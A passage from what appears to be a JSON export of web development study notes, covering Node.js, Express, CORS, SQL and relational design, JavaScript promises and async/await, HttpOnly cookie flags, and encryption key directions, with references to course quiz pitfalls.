freedom — decouple presentation layer from backend\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eDDD\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eLarge-codebase complexity — bounded contexts contain domain models\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eDOMA\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eMSA at scale (Uber) — group services into domain clusters with API boundaries\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003eAIaaS\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003eAI without ML infrastructure — call Google/AWS/Azure API, get AI results\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e\n\u003cul\u003e\n\u003cli\u003eHeadless ≠ serverless: headless is an API contract decision; serverless is an infrastructure decision\u003c/li\u003e\n\u003cli\u003eAutoML platforms (Google AutoML, HuggingFace, Kaggle) customize models without ML expertise\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Node.js runtime and modules","body_md":"- Single-threaded non-blocking: one thread handles all requests; I/O delegated to OS via libuv; callbacks fire when OS signals done\n- Chrome V8 engine compiles JS to native machine code; libuv handles async I/O\n- CPU-bound code (loops, crypto) blocks the event loop — offload to worker threads\n- Built-in modules: `http`, `url`, `fs` — no install; external: `mysql`, `express` — `npm install` required\n- `url.parse(req.url, true).pathname` → `/admin.html` (no query string); `.path` → `/admin.html?user=123`\n- `req` = incoming stream (read); `res` = outgoing response (`writeHead`, `write`, `end`) — never call `req.writeHead`\n- `.listen(port)` is non-blocking; must be called or server never accepts connections\n- File server pattern: `http.createServer` + `url.parse().pathname` + `fs.readFile` → 404 on err, 200 + data on success\n- `mysql` is NOT a built-in module (Quiz 7 Q1)","body_html":"\u003cul\u003e\n\u003cli\u003eSingle-threaded non-blocking: one thread handles all requests; I/O delegated to OS via libuv; callbacks fire when OS signals done\u003c/li\u003e\n\u003cli\u003eChrome V8 engine compiles JS to native machine code; libuv handles async I/O\u003c/li\u003e\n\u003cli\u003eCPU-bound code (loops, crypto) blocks the event loop — offload to worker threads\u003c/li\u003e\n\u003cli\u003eBuilt-in modules: \u003ccode\u003ehttp\u003c/code\u003e, \u003ccode\u003eurl\u003c/code\u003e, \u003ccode\u003efs\u003c/code\u003e — no install; external: \u003ccode\u003emysql\u003c/code\u003e, \u003ccode\u003eexpress\u003c/code\u003e — \u003ccode\u003enpm install\u003c/code\u003e required\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eurl.parse(req.url, true).pathname\u003c/code\u003e → \u003ccode\u003e/admin.html\u003c/code\u003e (no query string); \u003ccode\u003e.path\u003c/code\u003e → \u003ccode\u003e/admin.html?user=123\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ereq\u003c/code\u003e = incoming stream (read); \u003ccode\u003eres\u003c/code\u003e = outgoing response (\u003ccode\u003ewriteHead\u003c/code\u003e, \u003ccode\u003ewrite\u003c/code\u003e, \u003ccode\u003eend\u003c/code\u003e) — never call \u003ccode\u003ereq.writeHead\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e.listen(port)\u003c/code\u003e is non-blocking; must be called or server never accepts connections\u003c/li\u003e\n\u003cli\u003eFile server pattern: \u003ccode\u003ehttp.createServer\u003c/code\u003e + \u003ccode\u003eurl.parse().pathname\u003c/code\u003e + \u003ccode\u003efs.readFile\u003c/code\u003e → 404 on err, 200 + data on success\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003emysql\u003c/code\u003e is NOT a built-in module (Quiz 7 Q1)\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Express routing and middleware","body_md":"- `const app = express()` → app object; `app.listen(PORT, cb)` starts server\n- `PORT = process.env.PORT || 8888` — read env var with fallback\n- Route handlers: `app.get/post/put/patch/delete(path, (req, res) =\u003e {})`\n- `req.params.id` — URL segment; `req.body` — parsed body (needs `express.json()` middleware)\n- `app.use(fn)` registers middleware for every request; must call `next()` to continue pipeline\n- CORS middleware registered before routes: sets `Access-Control-Allow-*` headers on every response\n- `express.json()` middleware populates `req.body` for POST/PUT\n- PUT = idempotent (replaces entire resource); POST = not idempotent (creates new); PATCH = updates one property\n- Status codes: GET→200, POST→201, PUT/PATCH/DELETE→200\n- API versioning: `/api/v1/` segment lets server evolve without breaking old clients","body_html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003econst app = express()\u003c/code\u003e → app object; \u003ccode\u003eapp.listen(PORT, cb)\u003c/code\u003e starts server\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ePORT = process.env.PORT || 8888\u003c/code\u003e — read env var with fallback\u003c/li\u003e\n\u003cli\u003eRoute handlers: \u003ccode\u003eapp.get/post/put/patch/delete(path, (req, res) =&gt; {})\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ereq.params.id\u003c/code\u003e — URL segment; \u003ccode\u003ereq.body\u003c/code\u003e — parsed body (needs \u003ccode\u003eexpress.json()\u003c/code\u003e middleware)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eapp.use(fn)\u003c/code\u003e registers middleware for every request; must call \u003ccode\u003enext()\u003c/code\u003e to continue pipeline\u003c/li\u003e\n\u003cli\u003eCORS middleware registered before routes: sets \u003ccode\u003eAccess-Control-Allow-*\u003c/code\u003e headers on every response\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eexpress.json()\u003c/code\u003e middleware populates \u003ccode\u003ereq.body\u003c/code\u003e for POST/PUT\u003c/li\u003e\n\u003cli\u003ePUT = idempotent (replaces entire resource); POST = not idempotent (creates new); PATCH = updates one property\u003c/li\u003e\n\u003cli\u003eStatus codes: GET→200, POST→201, PUT/PATCH/DELETE→200\u003c/li\u003e\n\u003cli\u003eAPI versioning: \u003ccode\u003e/api/v1/\u003c/code\u003e segment lets server evolve without breaking old clients\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"AJAX, CORS, and Same-Origin Policy","body_md":"- SOP (Same-Origin Policy): browser rule; blocks cross-origin reads; origin = protocol + domain + port\n- CORS: server grants permission via `Access-Control-Allow-Origin` response header\n- `Access-Control-Allow-Origin: *` allows any origin; cannot combine `*` with `withCredentials: true`\n- `withCredentials: true` → server must specify exact origin + `Access-Control-Allow-Credentials: true`\n- XMLHttpRequest readyState: 0=UNSENT, 1=OPENED, 2=HEADERS_RECEIVED, 3=LOADING, 4=DONE (not 5)\n- Canonical guard: `if (this.readyState == 4 && this.status == 200)`\n- Preflight (OPTIONS): fires before non-simple requests (non-GET/POST method, or custom headers like `Content-Type: application/json`)\n- Simple GET or form-encoded POST → no preflight\n- Node.js CORS: handle `OPTIONS` method separately, respond 204 with Allow headers","body_html":"\u003cul\u003e\n\u003cli\u003eSOP (Same-Origin Policy): browser rule; blocks cross-origin reads; origin = protocol + domain + port\u003c/li\u003e\n\u003cli\u003eCORS: server grants permission via \u003ccode\u003eAccess-Control-Allow-Origin\u003c/code\u003e response header\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eAccess-Control-Allow-Origin: *\u003c/code\u003e allows any origin; cannot combine \u003ccode\u003e*\u003c/code\u003e with \u003ccode\u003ewithCredentials: true\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewithCredentials: true\u003c/code\u003e → server must specify exact origin + \u003ccode\u003eAccess-Control-Allow-Credentials: true\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eXMLHttpRequest readyState: 0=UNSENT, 1=OPENED, 2=HEADERS_RECEIVED, 3=LOADING, 4=DONE (not 5)\u003c/li\u003e\n\u003cli\u003eCanonical guard: \u003ccode\u003eif (this.readyState == 4 &amp;&amp; this.status == 200)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003ePreflight (OPTIONS): fires before non-simple requests (non-GET/POST method, or custom headers like \u003ccode\u003eContent-Type: application/json\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eSimple GET or form-encoded POST → no preflight\u003c/li\u003e\n\u003cli\u003eNode.js CORS: handle \u003ccode\u003eOPTIONS\u003c/code\u003e method separately, respond 204 with Allow headers\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Relational DB design — keys, relationships, normalization","body_md":"- **Primary key (PK):** uniquely identifies each row; cannot be NULL\n- **Foreign key (FK):** references another table's PK; enforces referential integrity\n- **Referential integrity:** every FK value must match an existing PK; parent table must be created first\n- **1:M:** one parent row → many child rows (Patient → Visit)\n- **M:M:** requires a junction table with composite PK (AuthorBook(authorid FK, bookid FK))\n- **1:1:** FK column in child table is UNIQUE (Person → BirthCertificate)\n- **1NF:** every cell holds one atomic value; no repeating groups\n- **2NF:** satisfies 1NF + every non-key column depends on the **whole** PK (not a partial subset)\n- **Cartesian join:** `SELECT * FROM A, B` → always n × m rows; column name collisions do NOT reduce count\n- **Patient/Visit schema:**\n  ```sql\n  CREATE TABLE patient (patientid INT NOT NULL, name VARCHAR(100), PRIMARY KEY(patientid));\n  CREATE TABLE visit (visitid INT NOT NULL, patientid INT NOT NULL, visitDate DATE,\n    PRIMARY KEY(visitid), FOREIGN KEY(patientid) REFERENCES patient(patientid));\n  ```\n- **AUTO_INCREMENT:** DB assigns PK automatically; omit column from INSERT","body_html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePrimary key (PK):\u003c/strong\u003e uniquely identifies each row; cannot be NULL\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eForeign key (FK):\u003c/strong\u003e references another table&#39;s PK; enforces referential integrity\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReferential integrity:\u003c/strong\u003e every FK value must match an existing PK; parent table must be created first\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e1:M:\u003c/strong\u003e one parent row → many child rows (Patient → Visit)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eM:M:\u003c/strong\u003e requires a junction table with composite PK (AuthorBook(authorid FK, bookid FK))\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e1:1:\u003c/strong\u003e FK column in child table is UNIQUE (Person → BirthCertificate)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e1NF:\u003c/strong\u003e every cell holds one atomic value; no repeating groups\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e2NF:\u003c/strong\u003e satisfies 1NF + every non-key column depends on the \u003cstrong\u003ewhole\u003c/strong\u003e PK (not a partial subset)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCartesian join:\u003c/strong\u003e \u003ccode\u003eSELECT * FROM A, B\u003c/code\u003e → always n × m rows; column name collisions do NOT reduce count\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePatient/Visit schema:\u003c/strong\u003e\u003cpre\u003e\u003ccode class=\"language-sql\"\u003eCREATE TABLE patient (patientid INT NOT NULL, name VARCHAR(100), PRIMARY KEY(patientid));\nCREATE TABLE visit (visitid INT NOT NULL, patientid INT NOT NULL, visitDate DATE,\n  PRIMARY KEY(visitid), FOREIGN KEY(patientid) REFERENCES patient(patientid));\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAUTO_INCREMENT:\u003c/strong\u003e DB assigns PK automatically; omit column from INSERT\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"SQL CRUD — SELECT, INSERT, UPDATE, DELETE","body_md":"- **SELECT:** `SELECT * FROM T` · `SELECT DISTINCT col FROM T` · `SELECT col FROM T WHERE cond`\n- **WHERE operators:** `=`, `\u003c\u003e`, `BETWEEN`, `LIKE` (`%` = 0+ chars, `_` = 1 char), `IN`\n- **Equi-join:** `SELECT * FROM A, B WHERE A.id = B.a_id` (not Cartesian)\n- **GROUP BY + HAVING order:** `WHERE` (before GROUP BY) → `GROUP BY` → `HAVING` (after GROUP BY; for aggregates)\n  - `WHERE` cannot be used on aggregate functions — use `HAVING`\n  - `WHERE col_alias \u003e n` invalid — alias not in scope until after SELECT\n- **Subquery:** `SELECT * FROM Products WHERE price \u003e (SELECT AVG(price) FROM Products)`\n- **`IS`** is for NULL only: `WHERE col IS NULL` — use `=` for string comparison\n- **`SELECT all`** is a syntax error; use `SELECT *`\n- **SQL injection fix:** parameterized queries `db.query('SELECT ? WHERE id=?', [val, id])` — never template literals\n- **SQL is case-insensitive:** `SELECT` = `select`; table names are also case-insensitive","body_html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSELECT:\u003c/strong\u003e \u003ccode\u003eSELECT * FROM T\u003c/code\u003e · \u003ccode\u003eSELECT DISTINCT col FROM T\u003c/code\u003e · \u003ccode\u003eSELECT col FROM T WHERE cond\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWHERE operators:\u003c/strong\u003e \u003ccode\u003e=\u003c/code\u003e, \u003ccode\u003e&lt;&gt;\u003c/code\u003e, \u003ccode\u003eBETWEEN\u003c/code\u003e, \u003ccode\u003eLIKE\u003c/code\u003e (\u003ccode\u003e%\u003c/code\u003e = 0+ chars, \u003ccode\u003e_\u003c/code\u003e = 1 char), \u003ccode\u003eIN\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEqui-join:\u003c/strong\u003e \u003ccode\u003eSELECT * FROM A, B WHERE A.id = B.a_id\u003c/code\u003e (not Cartesian)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGROUP BY + HAVING order:\u003c/strong\u003e \u003ccode\u003eWHERE\u003c/code\u003e (before GROUP BY) → \u003ccode\u003eGROUP BY\u003c/code\u003e → \u003ccode\u003eHAVING\u003c/code\u003e (after GROUP BY; for aggregates)\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eWHERE\u003c/code\u003e cannot be used on aggregate functions — use \u003ccode\u003eHAVING\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eWHERE col_alias &gt; n\u003c/code\u003e invalid — alias not in scope until after SELECT\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSubquery:\u003c/strong\u003e \u003ccode\u003eSELECT * FROM Products WHERE price &gt; (SELECT AVG(price) FROM Products)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eIS\u003c/code\u003e\u003c/strong\u003e is for NULL only: \u003ccode\u003eWHERE col IS NULL\u003c/code\u003e — use \u003ccode\u003e=\u003c/code\u003e for string comparison\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eSELECT all\u003c/code\u003e\u003c/strong\u003e is a syntax error; use \u003ccode\u003eSELECT *\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSQL injection fix:\u003c/strong\u003e parameterized queries \u003ccode\u003edb.query(&#39;SELECT ? WHERE id=?&#39;, [val, id])\u003c/code\u003e — never template literals\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eSQL is case-insensitive:\u003c/strong\u003e \u003ccode\u003eSELECT\u003c/code\u003e = \u003ccode\u003eselect\u003c/code\u003e; table names are also case-insensitive\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Node.js MySQL connection","body_md":"- **mysql is external:** `npm install mysql` — not built-in (url, http, fs, path are built-in)\n- **Credentials MUST be server-side** — never in client JS (exposed via DevTools)\n- **3-step pattern:**\n  1. `const con = mysql.createConnection({ host, user, password, database })`\n  2. `con.connect(err =\u003e { ... })`\n  3. `con.query(sql, callback)` — result only available inside callback\n- **Promise-chained queries:** `const pc = con.promise(); const [rows] = await pc.query(sql, [args])`\n- **`[rows, fields]`** — promise query resolves with this array; destructure first element for rows\n- **Race condition:** firing UPDATE before awaiting SELECT result → use `await` / `.then()` chaining\n- **XAMPP:** installs MySQL engine + phpMyAdmin at `http://localhost/phpmyadmin/`\n- **AUTO_INCREMENT:** omit PK from INSERT; `result.insertId` holds generated key","body_html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003emysql is external:\u003c/strong\u003e \u003ccode\u003enpm install mysql\u003c/code\u003e — not built-in (url, http, fs, path are built-in)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCredentials MUST be server-side\u003c/strong\u003e — never in client JS (exposed via DevTools)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e3-step pattern:\u003c/strong\u003e\u003col\u003e\n\u003cli\u003e\u003ccode\u003econst con = mysql.createConnection({ host, user, password, database })\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003econ.connect(err =&gt; { ... })\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003econ.query(sql, callback)\u003c/code\u003e — result only available inside callback\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ePromise-chained queries:\u003c/strong\u003e \u003ccode\u003econst pc = con.promise(); const [rows] = await pc.query(sql, [args])\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e[rows, fields]\u003c/code\u003e\u003c/strong\u003e — promise query resolves with this array; destructure first element for rows\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRace condition:\u003c/strong\u003e firing UPDATE before awaiting SELECT result → use \u003ccode\u003eawait\u003c/code\u003e / \u003ccode\u003e.then()\u003c/code\u003e chaining\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eXAMPP:\u003c/strong\u003e installs MySQL engine + phpMyAdmin at \u003ccode\u003ehttp://localhost/phpmyadmin/\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAUTO_INCREMENT:\u003c/strong\u003e omit PK from INSERT; \u003ccode\u003eresult.insertId\u003c/code\u003e holds generated key\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Promises — states, executor, chaining","body_md":"**States:** `pending` → `fulfilled` (resolve called) or `rejected` (reject called). Once settled, state is locked.\n\n**Constructor:**\n```js\nlet p = new Promise((resolve, reject) =\u003e {\n  resolve('value'); // or reject('reason')\n});\n```\n\n**Executor is eager** — runs synchronously at `new Promise(...)` construction, before subsequent statements.\n\n**Handlers are microtasks** — `.then()` / `.catch()` / `.finally()` run after the current call stack empties, not inline with `resolve()`.\n\n```js\nconst fn = () =\u003e new Promise((resolve) =\u003e {\n  console.log(1);   // eager executor — sync\n  resolve('done');\n});\nfn().then(v =\u003e console.log(v)); // microtask\nconsole.log('start');           // sync\n// Output: 1, start, done\n```\n\n**Mutual exclusion** — first of `resolve` or `reject` wins; subsequent calls are no-ops.\n\n**Pitfall (ISAQuiz8 Q3):** `reject('3'); resolve('4');` → `'4'` never logs. Promise already settled.\n\n**Pitfall (ISAQuiz8 Q2):** executor never calls resolve/reject → Promise stays pending → `.then()` never fires.\n\n**Chain mechanics:** `.then()` always returns a **new** Promise. Return value from callback → fulfills next. Throw → rejects next.\n\n```js\nPromise.resolve(1)\n  .then(a =\u003e { return a * 2; })   // 2\n  .then(b =\u003e { return b * 3; })   // 6\n  .then(c =\u003e console.log(c));      // 6\n```\n\n**`.catch(fn)`** = `.then(undefined, fn)` — handles rejection from any upstream step.\n\n**`.finally(f)`** — runs on any settled outcome; `f` receives **no value** (`undefined`); original value passes through.\n\n**Microtask vs macrotask (ISAQuiz9 Q3):**\n```\nsetTimeout   →  macrotask (fires after ALL microtasks drain)\n.then()      →  microtask (drains completely before next macrotask)\n```\nOutput order: synchronous → microtasks (all) → macrotask → repeat.","body_html":"\u003cp\u003e\u003cstrong\u003eStates:\u003c/strong\u003e \u003ccode\u003epending\u003c/code\u003e → \u003ccode\u003efulfilled\u003c/code\u003e (resolve called) or \u003ccode\u003erejected\u003c/code\u003e (reject called). Once settled, state is locked.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eConstructor:\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003elet p = new Promise((resolve, reject) =&gt; {\n  resolve(&#39;value&#39;); // or reject(&#39;reason&#39;)\n});\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eExecutor is eager\u003c/strong\u003e — runs synchronously at \u003ccode\u003enew Promise(...)\u003c/code\u003e construction, before subsequent statements.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eHandlers are microtasks\u003c/strong\u003e — \u003ccode\u003e.then()\u003c/code\u003e / \u003ccode\u003e.catch()\u003c/code\u003e / \u003ccode\u003e.finally()\u003c/code\u003e run after the current call stack empties, not inline with \u003ccode\u003eresolve()\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003econst fn = () =&gt; new Promise((resolve) =&gt; {\n  console.log(1);   // eager executor — sync\n  resolve(&#39;done&#39;);\n});\nfn().then(v =&gt; console.log(v)); // microtask\nconsole.log(&#39;start&#39;);           // sync\n// Output: 1, start, done\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eMutual exclusion\u003c/strong\u003e — first of \u003ccode\u003eresolve\u003c/code\u003e or \u003ccode\u003ereject\u003c/code\u003e wins; subsequent calls are no-ops.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall (ISAQuiz8 Q3):\u003c/strong\u003e \u003ccode\u003ereject(&#39;3&#39;); resolve(&#39;4&#39;);\u003c/code\u003e → \u003ccode\u003e&#39;4&#39;\u003c/code\u003e never logs. Promise already settled.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall (ISAQuiz8 Q2):\u003c/strong\u003e executor never calls resolve/reject → Promise stays pending → \u003ccode\u003e.then()\u003c/code\u003e never fires.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eChain mechanics:\u003c/strong\u003e \u003ccode\u003e.then()\u003c/code\u003e always returns a \u003cstrong\u003enew\u003c/strong\u003e Promise. Return value from callback → fulfills next. Throw → rejects next.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003ePromise.resolve(1)\n  .then(a =&gt; { return a * 2; })   // 2\n  .then(b =&gt; { return b * 3; })   // 6\n  .then(c =&gt; console.log(c));      // 6\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003e.catch(fn)\u003c/code\u003e\u003c/strong\u003e = \u003ccode\u003e.then(undefined, fn)\u003c/code\u003e — handles rejection from any upstream step.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003e.finally(f)\u003c/code\u003e\u003c/strong\u003e — runs on any settled outcome; \u003ccode\u003ef\u003c/code\u003e receives \u003cstrong\u003eno value\u003c/strong\u003e (\u003ccode\u003eundefined\u003c/code\u003e); original value passes through.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eMicrotask vs macrotask (ISAQuiz9 Q3):\u003c/strong\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003esetTimeout   →  macrotask (fires after ALL microtasks drain)\n.then()      →  microtask (drains completely before next macrotask)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eOutput order: synchronous → microtasks (all) → macrotask → repeat.\u003c/p\u003e"},{"heading":"async / await","body_md":"`async function f() { return x }` ≡ `function f() { return Promise.resolve(x) }` — always returns a Promise.\n\n`typeof asyncFn()` → `\"object\"` (ISAQuiz8 Q11).\n\n`await` pauses the **async function** only — not the JS thread. Equivalent to `.then()`.\n\n```js\n// Promise chain vs async/await — identical behavior\nasync function getUser(id) {\n  try {\n    const res  = await fetch(`/api/users/${id}`);\n    const data = await res.json();\n    return data.name;\n  } catch (err) {\n    console.error(err);\n  }\n}\n```\n\n**Pitfall:** Omitting `await` → variable holds a Promise object, not the value. Silent bug — no error thrown.\n\n**Pitfall:** `await` outside an `async` function → `SyntaxError` at parse time.","body_html":"\u003cp\u003e\u003ccode\u003easync function f() { return x }\u003c/code\u003e ≡ \u003ccode\u003efunction f() { return Promise.resolve(x) }\u003c/code\u003e — always returns a Promise.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003etypeof asyncFn()\u003c/code\u003e → \u003ccode\u003e&quot;object&quot;\u003c/code\u003e (ISAQuiz8 Q11).\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eawait\u003c/code\u003e pauses the \u003cstrong\u003easync function\u003c/strong\u003e only — not the JS thread. Equivalent to \u003ccode\u003e.then()\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"language-js\"\u003e// Promise chain vs async/await — identical behavior\nasync function getUser(id) {\n  try {\n    const res  = await fetch(`/api/users/${id}`);\n    const data = await res.json();\n    return data.name;\n  } catch (err) {\n    console.error(err);\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e Omitting \u003ccode\u003eawait\u003c/code\u003e → variable holds a Promise object, not the value. Silent bug — no error thrown.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall:\u003c/strong\u003e \u003ccode\u003eawait\u003c/code\u003e outside an \u003ccode\u003easync\u003c/code\u003e function → \u003ccode\u003eSyntaxError\u003c/code\u003e at parse time.\u003c/p\u003e"},{"heading":"HttpOnly cookies — auth flow and flags","body_md":"**Set-Cookie on login:**\n`Set-Cookie: token=abc; HttpOnly; Path=/; SameSite=None; Secure; Max-Age=60`\n\n**Delete on logout (all attributes must match):**\n`Set-Cookie: token=; HttpOnly; Path=/; Max-Age=0; SameSite=None; Secure`\n\n| Flag | Effect |\n|---|---|\n| `HttpOnly` | Blocks `document.cookie` — JS cannot read it (stops XSS theft) |\n| `Secure` | HTTPS only |\n| `SameSite=None` | Cross-origin sending allowed (requires `Secure`) |\n| `SameSite=Strict/Lax` | Restrict cross-site sending → CSRF mitigation |\n| `Max-Age=0` | Delete immediately |\n\n**Cross-origin cookie flow** — BOTH required:\n- Client: `xhr.withCredentials = true`\n- Server: `Access-Control-Allow-Credentials: true`\n\n**Pitfall (ISAQuiz11 Q3, Q8):** Risks of no HttpOnly = **all of them** (XSS + session hijacking + CSRF). Selecting only XSS scores zero.","body_html":"\u003cp\u003e\u003cstrong\u003eSet-Cookie on login:\u003c/strong\u003e\n\u003ccode\u003eSet-Cookie: token=abc; HttpOnly; Path=/; SameSite=None; Secure; Max-Age=60\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eDelete on logout (all attributes must match):\u003c/strong\u003e\n\u003ccode\u003eSet-Cookie: token=; HttpOnly; Path=/; Max-Age=0; SameSite=None; Secure\u003c/code\u003e\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eFlag\u003c/th\u003e\n\u003cth\u003eEffect\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eHttpOnly\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eBlocks \u003ccode\u003edocument.cookie\u003c/code\u003e — JS cannot read it (stops XSS theft)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eSecure\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eHTTPS only\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eSameSite=None\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eCross-origin sending allowed (requires \u003ccode\u003eSecure\u003c/code\u003e)\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eSameSite=Strict/Lax\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eRestrict cross-site sending → CSRF mitigation\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003ccode\u003eMax-Age=0\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eDelete immediately\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\u003c/table\u003e\n\u003cp\u003e\u003cstrong\u003eCross-origin cookie flow\u003c/strong\u003e — BOTH required:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eClient: \u003ccode\u003exhr.withCredentials = true\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eServer: \u003ccode\u003eAccess-Control-Allow-Credentials: true\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003ePitfall (ISAQuiz11 Q3, Q8):\u003c/strong\u003e Risks of no HttpOnly = \u003cstrong\u003eall of them\u003c/strong\u003e (XSS + session hijacking + CSRF). Selecting only XSS scores zero.\u003c/p\u003e"},{"heading":"Asymmetric and symmetric encryption","body_md":"| | Symmetric | Asymmetric |\n|---|---|---|\n| Keys | 1 secret key (shared) | Public + private per party |\n| Key exchange needed? | Yes (the hard problem) | No |\n| Speed | Fast | Slower |\n| Algorithms | AES | RSA, Diffie-Hellman |\n\n**Key directions (OPPOSITE for signing vs encryption):**\n\n| Operation | Sender uses | Receiver uses |\n|---|---|---|\n| Signing | Sender's **private** key | Sender's **public** key (verify) |\n| Encryption | Receiver's **public** key | Receiver's **private** key (decrypt) |\n\n**Amir→Tom double-envelope (ISAQuiz11 Q9):**\n1. Encrypt with Tom's **public** key → only Tom's **private** key opens\n2. Sign with Amir's **private** key → Tom verifies with Amir's **public** key\n\n**Pitfall:** Verification uses the SENDER's public key (not receiver's). Confusing verify/decrypt = most common Q9 